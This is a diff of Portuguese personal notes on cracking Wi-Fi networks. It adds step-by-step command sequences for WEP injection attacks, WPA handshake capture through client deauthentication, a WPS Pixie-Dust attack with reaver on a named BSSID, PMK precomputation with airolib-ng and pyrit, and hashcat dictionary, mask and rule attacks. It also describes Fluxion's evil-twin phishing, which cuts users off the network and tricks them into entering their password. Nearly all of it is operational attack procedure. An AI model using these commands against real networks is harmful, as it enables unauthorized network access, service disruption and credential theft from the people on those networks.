@@ -1,5 +1,30 @@
 WEP
 
+airmon-ng check kill
+airmon-ng start wlan0
+
+airodump-ng mon0 (copiar os detalhes do alvo)
+
+airodump-ng -c <ch> -w nomedoarquivo --bssid <mac> mon0
+
+ctrl+shift+n
+
+aireplay-ng -1 0 -a <macAP> -e <NomedaRede> wlan0mon (-h mac falso)
+esperar a mensagem "Association successful"
+
+aireplay-ng -3 -b <macAP> mon0 pode usar -h opcional
+READ
+
+USAR makeivs-ng
+
+ctrl+shift+n
+
+aircrack-ng -b <mac> nomedoarquivo-01.cap
+
+------------------------------------------------------
+
+WPA e WPA2
+
 airmon-ng check kill (Mata os processos relacionadas a rede wifi)
 airmon-ng start wlan0 (ativa o modo de monitoramento na interface especificada)
 
@@ -20,23 +45,25 @@ AUTH = Tipo de Autenticação
 
 airodump-ng interface -c <ch> --bssid <mac> -w NameOutFile
 
+-w = Escrever trafego em um arquivo .cap
+
 ctrl+shift+n
 
-aireplay-ng -1 0 -a <macAP> -e <NomedaRede> mon0 (-h mac falso)
-esperar a mensagem "Association successful"
+aireplay-ng --deauth 5 -a <macAP> -c <MacCliente> wlan0mon (-h mac falso, opcional)
 
-aireplay-ng -3 -b <macAP> mon0 pode usar -h opcional
-READ
+--deauth = Desautenticar N = numero de quadros de desautenticar
 
-USAR makeivs-ng
+
+No celular esperar a mensagem "Association successful" no cliente
+E no terminal airodump esperar a mensagem WPA Handshake: [MAC:DO:AP]
+
+
 
 ctrl+shift+n
 
 aircrack-ng -b <mac> nomedoarquivo-01.cap
---------------------------------------------------
-WPA e WPA2
 
-repete os processos iniciais do wep, obtidas as info...
+resumo:
 
 airodump-ng --essid --bssid --channel -w nomedoarquivo mon0
 ctrl+shif+n
@@ -53,25 +80,38 @@ aricrack-ng -w wordlist.txt arquivo-01.cap (-b mac)
 ou podemos usar o pre-processamento com um banco de dados:
 
 aircrack-ng -r arquivo.db arquivo-01.cap (-b mac/-e nomeAP)
-------------------------------------------------------------
-Airolib-ng criando banco de dados para senhas de wifi
 
-criar-se o banco ja importando algo ou com r > arquivo.db
+-r = quebra com arquivo de banco de dados
+
+
+WPS reaver + PIXIEDUST
+
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon --wps
+reaver -i wlan0mon -b 54:A6:5C:89:D1:1F -vv -K 1
+
+------------------------------------------------------------
+
+Airolib-ng criando banco de dados para quebrar senhas de wifi
+
+cria-se o banco ja importando algo ou com r > arquivo.db
 
 airolib-ng namearquivo --import essid nomedoarquivocomosessids.txt
 airolib-ng namearquivo --import passwd nwordlist.txt (.lst)
 
-r > essids.txt
+nano essids.txt
+cat essids.txt
 
 essid1
 essid2
 ....
 
-tanto o arquivo essid quanto a wordlist... tem que ser bem parametrados
-marcando a nova insercao com o enter para novo item ser escrito..
+tanto o arquivo essids quanto a wordlist... tem que ser bem parametrados
+marcando a nova insercao com o enter para novo item a ser escrito..
 como no exemplo acima a respeito dos essids.
 
-importados essids e passwds iniciamos a formatacao do nosso db
+importados essids e passwds, iniciamos a formatacao do nosso db
 
 airolib-ng namedoarquivo --clean all
 estamos limpando espacos e excluindo dados invalidos
@@ -85,17 +125,19 @@ airolib-ng nomedoarquivo --batch
 aqui ele vai iniciar o processo de precarregamento
 gerando blocos de pmk's. A dica eh usar um essid para 
 cada banco pois em grande escala de passwords ele demora muito
-se acrescentarmos mais essids o tempo dobre.. entao ou voce usa
+se acrescentarmos mais essids o tempo dobra.. entao ou voce usa
 um essid e carrega muitas senhas, ou voce usa muitos essid e carrega
-aos poucos...
+poucas...
+
 
 airolib-ng nomedoarquivo --verify all
 verifica se tudo ocorreu bem e remove pmk's nao referenciadas.
 
 aircrack-ng -r nomedb arquivo-cap -e essid.
+Quebra o handshake usando as senhas precomputadas no db.
 
 
-basicamente esses comandos devem ser executados de forma consecutivas e na ordem como descrito.
+Basicamente esses comandos devem ser executados de forma consecutivas e na ordem como descrito.
 
 os demais sao utilitarios em geral.
 
@@ -124,7 +166,7 @@ importar 1 essid
 "echo suasenha | airolib-ng namedb -import passwd -"
 
 
-iniciar processo em lote
+iniciar processamento em lote
 
 ("airolib-ng namedb -batch")
 
@@ -144,18 +186,392 @@ genpmk -f caminhodoarquivo .txt ou .lst -d hashes -s nomedarede
 
 gerar tabela cowpatty
 
-cowpatty -d hashfile -r dumpfile -ssid
-
-
-FIM
+cowpatty -d hashfile -r dumpfile.cap -ssid
+Usa hainbowtables para atacar o handshake
 
 -------------------------------------------------------------------------------
+
+PYRIT:
+
+pyrit -e nomedarede create_ssid
+
+
+(pyrit -i wordlist.txt import_passwords)
+
+
+para ataque com password txt usar
+
+(pyrit -i wordlist.txt -r arquivo.cap attack_passthrough)
+
+
+
+ataque com arquivos de hash.cow
+
+(pyrit -i hashfile -r arquivo.cap attack_cowpatty)
+
+
+
+Criando PMK's
+(pyrit batch)
+
+
+ataque com PMK's, deve usar as pmks geradas no proprio banco de dados.
+
+(pyrit -r arquivo.cap attack_batch)
+
+ataque com banco de dados do airolib-ng
+
+(pyrit -i wpadb -r -01.cap attack_db)
+
+
+
+checar por erros no db atual do pyrit
+
+(pyrit check_db)
+
+
+
+opções a inserir no final do -e 
+
+create_essid delete_essid
+
+ 
+
+opções de exportação 
+
+export_cowpatty 
+export_hashdb (pro airolib) ver -i std..
+
+
+export_password
+
+passthrough Cumpute PMKs e escreve num arquivo
+
+
+
+help (printa informações gerais)
+
+
+
+relay 
+
+(
+
+
+tanto -i infile ou -o outfile suportam .gz ao gerar a lista comprima em .gz para comprimir a wordlist e economizar armazenamento.
+
+pyrit -r pcap (--all-handshakes) (analyze)
+
+saidas: 
+Good: Handshake confirma a info da estação para o acess point.
+
+Workable: Quase foi capturado
+
+Bad: Não foi capturado!
+
+
+
+-u url link de banco de dados
+
+
+
+Resumo:
+
+
+
+pyrit list_cores
+(listar core-nucleos)
+
+
+pyrit benchmark (testar capacidade total)
+
+
+
+todos os -i podem usar o final import_tipodoarquivo
+
+
+
+
+pyrit list_essids
+
+
+pyrit import_unique_passwords
+
+
+
+linhas perfeitas
+
+
+pyrit -r -e -b -o attack_batch
+
+export_cowpatty
+pyrit -o file.cow -e nomerede export_cowpatty
+
+
+
+A ideia é, gerar os arquivos txt, importar como passwords, batch e exportar o arquivo .cow e importa-lo no airolib-ng gerando um banco de dados exclusivo para
+o ESSID em campanha, e neste banco nenhum ESSID nem entra e nem sai. 
+
+Estima-se que se carregem 4 arquivos/dia o que significa 3 dias de trabalho para cobrir 
+todas as senhas de 8 digitos e 6 dias para todas incluso as de 9digcell e umas 2 de nomes. 
+
+Ou seja em uma semana a probabilidade beira os 99% dependendo de 
+seu planejamento e elaboração no serviço.
+
+Então maos a obra...
+
+--------------------------------------------------------------------------------
+
+hashcat
+
+recuperação avançada de senha
+
+    hashcat
+    Fóruns
+    Wiki
+    Ferramentas
+    Eventos
+
+
+    Cracking WPA / WPA2 com hashcat
+        O .cap e .hccapx
+        Preparação
+            Ataque de dicionário
+            Ataque de força bruta
+            Ataque baseado em regras 
+
+Cracking WPA / WPA2 com hashcat
+O .cap e .hccapx
+
+hashcat aceita WPA / WPA2 hashes no próprio formato de arquivo "hccapx" do hashcat. Supondo que você já tenha capturado um handshake de 4 vias usando wlandump-ng (hcxtools), wlanresponse (hcxtools), airodump-ng (aircrack-ng), besside-ng (aircrack-ng), Wireshark ou tcpdump. Recomenda-se a utilização de hcxtools.
+
+    Obtenha hcxtools em https://github.com/ZerBea/hcxtools
+    Use wlandump-ng ou wlanresponse para capturar 
+
+O próximo passo será converter o arquivo .cap para o formato hccapx que o hashcat pode entender. A maneira mais fácil de fazer isso é usar esta interface web fornecida pela equipe hashcat:
+
+    https://hashcat.net/cap2hccapx/ 
+
+Basta fazer o upload do seu .cap, e ele será convertido em um arquivo .hccapx.
+
+Claro, você pode não querer enviar dados confidenciais para um site que você não controla. Se você não se importa, vá para ele. Caso contrário, você pode baixar o utilitário cap2hccapx e executá-lo localmente, usando as seguintes etapas:
+
+    Obter hashcat-utils de https://github.com/hashcat/hashcat-utils
+    Use cap2hccapx para converter localmente 
+
+Uma visão geral técnica do formato de arquivo hccapx também está disponível.
+Para converter seus arquivos .cap manualmente em Backtrack / Kali
+
+O utilitário cap2hccapx e hcxtools ainda são muito novos. Nessa escrita, Kali ainda não atualizou o hccap para o hccapx.
+Preparação
+
+O hashcat é muito flexível, então abordarei três cenários mais comuns e básicos:
+
+    Ataque de dicionário
+    Ataque de força bruta
+    Ataque baseado em regras 
+
+Ataque de dicionário
+
+    Pegue uma lista de palavras, como RockYou .
+    Coloque-o na pasta hashcat.
+    Renomeie seu arquivo de captura convertido "capture.hccapx".
+    No Windows, crie um arquivo em lotes "attack.bat", abra-o com um editor de texto e cole o seguinte: 
+
+  hashcat.exe -m 2500 capture.hccapx rockyou.txt
+ pausa 
+
+Execute o ataque usando o arquivo em lotes, que deve ser alterado para atender às suas necessidades.
+Ataque de força bruta
+
+    Renomeie seu arquivo de captura convertido "capture.hccapx".
+    Crie um arquivo em lotes "attack.bat", abra-o com um editor de texto e cole o seguinte: 
+
+  hashcat.exe -m 2500 -a3 capture.hccapx? d? d? d? d? d? d? d? d
+ pausa 
+
+Isso limitará os dígitos dos dígitos de comprimento 8 para o hashcat. Substitua o? D conforme necessário.
+
+Seria sensato estimar primeiro o tempo que demoraria para processar usando uma calculadora .
+
+TBD: adicione alguns exemplos de prazos para máscaras comuns / velocidade comum
+Ataque baseado em regras
+
+Isso é semelhante a um ataque do Dicionário, mas os comandos parecem um pouco diferentes:
+
+  hashcat.exe -m 2500 -r rules / best64.rule capture.hccapx rockyou.txt
+ pausa 
+
+Isso irá mutar a lista de palavras RockYou com as melhores 64 regras, que vêm com a distribuição hashcat.
+
+Mude conforme necessário e lembre-se, o tempo que demora no ataque aumentará proporcionalmente com a quantidade de regras.
+
+Quais são as regras?
+
+
+ORIGINAL INGLES
+
+hashcat
+
+advanced password recovery
+
+    hashcat
+    Forums
+    Wiki
+    Tools
+    Events
+
+
+    Cracking WPA/WPA2 with hashcat
+        The .cap and .hccapx
+        Preparation
+            Dictionary attack
+            Brute-Force Attack
+            Rule-based attack 
+
+Cracking WPA/WPA2 with hashcat
+The .cap and .hccapx
+
+hashcat accepts WPA/WPA2 hashes in hashcat's own “hccapx” file format. Assuming that you have already captured a 4-way handshake using wlandump-ng (hcxtools), wlanresponse (hcxtools), airodump-ng (aircrack-ng), besside-ng (aircrack-ng), Wireshark or tcpdump. It is recommended to use hcxtools.
+
+    Get hcxtools from https://github.com/ZerBea/hcxtools
+    Use wlandump-ng or wlanresponse to capture 
+
+The next step will be to convert the .cap file to the hccapx format that hashcat can understand. The easiest way to do this is to use this web interface provided by the hashcat team:
+
+    https://hashcat.net/cap2hccapx/ 
+
+Just upload your .cap, and it will be converted to a .hccapx file.
+
+Of course, you may not want to upload sensitive data to a web site that you do not control. If you don't mind, go for it. Otherwise, you can download the cap2hccapx utility and execute it locally, using the following steps:
+
+    Get hashcat-utils from https://github.com/hashcat/hashcat-utils
+    Use cap2hccapx to convert locally 
+
+A technical overview of the hccapx file format is also available.
+To convert your .cap files manually in Backtrack/Kali
+
+The cap2hccapx utility and hcxtools are still very new. At this writing, Kali has not yet updated from hccap to hccapx.
+Preparation
+
+hashcat is very flexible, so I'll cover three most common and basic scenarios:
+
+    Dictionary attack
+    Brute-Force attack
+    Rule-based attack 
+
+Dictionary attack
+
+    Grab a wordlist, like RockYou .
+    Put it into the hashcat folder.
+    Rename your converted capture file “capture.hccapx”.
+    On Windows, create a batch file “attack.bat”, open it with a text editor, and paste the following: 
+
+  hashcat.exe -m 2500 capture.hccapx rockyou.txt
+ pause 
+
+Execute the attack using the batch file, which should be changed to suit your needs.
+Brute-Force Attack
+
+    Rename your converted capture file “capture.hccapx”.
+    Create a batch file “attack.bat”, open it with a text editor, and paste the following: 
+
+  hashcat.exe -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d
+ pause 
+
+This will pipe digits-only strings of length 8 to hashcat. Replace the ?d as needed.
+
+It would be wise to first estimate the time it would take to process using a calculator .
+
+TBD: add some example timeframes for common masks / common speed
+Rule-based attack
+
+This is similar to a Dictionary attack, but the commands look a bit different:
+
+  hashcat.exe -m 2500 -r rules/best64.rule capture.hccapx rockyou.txt
+ pause 
+
+This will mutate the RockYou wordlist with best 64 rules, which come with the hashcat distribution.
+
+Change as necessary and remember, the time it will take the attack to finish will increase proportionally with the amount of rules.
+
+What are rules? 
+
+
+
+
+
+
+-------------------------------------------------------------------------------
+
+Ainda eh possivel fazer tudo isso via phishing offline.
+
+Uma ferramenta que automatiza todo o processo de captura de senhas wifi
+se chama fluxion, eh uma excelente ferramenta para este tipo de testes
+e funciona como um RANSOMWARE. 
+
+Seu funcionamento consistem em enviar pacotes de desautenticacao na rede alvo
+o que causa interrupcao imediata de todos os clientes conctados na rede, deixando
+a rede indisponivel. Enquanto isso acontece constantemente um gemeo do mal eh iniciado
+
+Uma rede clone eh criada, e a ideia eh o usuario ser enganado e se conectar na rede wifi aberta
+que tem o mesmo nome da original, entretanto, eh criado um certificado ssl que faz com que
+no momento que o usuario se conecta a rede clone ele recebe um ip, e navegue sem sentir diferenca.
+
+Neste momento um redirecionamento eh feito para induzir o usuario a digitar a senha para supostamente 
+"Liberar a conexao com a internet." Se isso for feito e o usuario inserir a senha correta
+a senha eh exibida para o atacante e o ataque se encerra, a rede clone desaparece e a rede original
+eh desbloqueada.
+
+Fluxion eh a melhor solucao para testes de seguranca na modalidade engenharia social.
+Ela nao usa brute-force, a unica senha que compara com o hash do handshake, eh a que o usuario digitar.
+Este ataque depende de um usuario que esteja autenticado na rede alvo.
+
+https://github.com/FluxionNetwork/fluxion
+
+--------------------------------------------------------------------------------------------------
 
 FALHA KRACK
 
 https://www.krackattacks.com/
 
+Esta falha permite acesso a rede, interceptacao de trafego MITM e spoofing em redes wifi.
+
+Entretanto ela usa um metodo diferente. Explora uma vulnerabilidade na transmissao das mensagens
+que sao trocadas entre os dispositivos durante a autenticacao (Handshake)
+O que significa que ele nao da acesso a senha, ele simplesmente ignora a senha e penetra a rede de forma arbitraria
+
+Observacao. A seguranca de uma rede wifi eh muito mais complexa do que imaginamos, a cada novo lancamento
+uma nova falha eh descoberta e isso vem acontecendo desde o WEP. Atualmente o mundo todo utiliza comumente o protocolo WPA2
+Entretanto como ja conhecemos este nao eh seguro.
+Esta eh a vulnerabilidade mais critica do protocolo de CRIPTOGRAFIA WPA2.
+
+O mais recente protocolo lancado eh o WPA3, ele foi lancado apos o expose da KRACK, com a ajuda do
+PHD que encontrou descobriu a VULN KRACK. Ateh entao tudo bem... Agora sim, nossas redes wifi estao segura!
+
+Nao. Pois em menos de 6 meses apos o lanacamento do WPA3, mesmo com o grande apoio de um PHD que teria corrigido a VULNERABILIDADE
+no WPA2, o WPA3 nao foi suficiente para parar os hackers de wifi.
+
+Pesquisadores descobrem um problema no HANDSHAKE do WPA3 e batizam o ataque com o nome de 
+DRAGONBLOOD
+
+---------------------------------------------------------------------------------------
+
+DragonBlood WPA3
+
+Funcionamento
+https://www.youtube.com/watch?v=WZyK_v6xa9o
+
+PoC
+https://www.youtube.com/watch?v=msTugNs8bnM
+
+BlackHat conferencia detalhada WPA3 Dragonblood
+https://www.youtube.com/watch?v=tRWMp3jXlRg
+
+
 --------------------------------------------------------------------------------------
+
+Anotacoes.
 
 WPS BULLY DO GITHUB
 
@@ -168,8 +584,5 @@ apt-get -y install build-essential libpcap-dev libssl1.0-dev aircrack-ng pixiewp
 https://github.com/aanarchyy/bully
 
 git clone https://github.com/wiire/pixiewps
-
-
-Detalhe: Kali Linux 2017.1
 
 
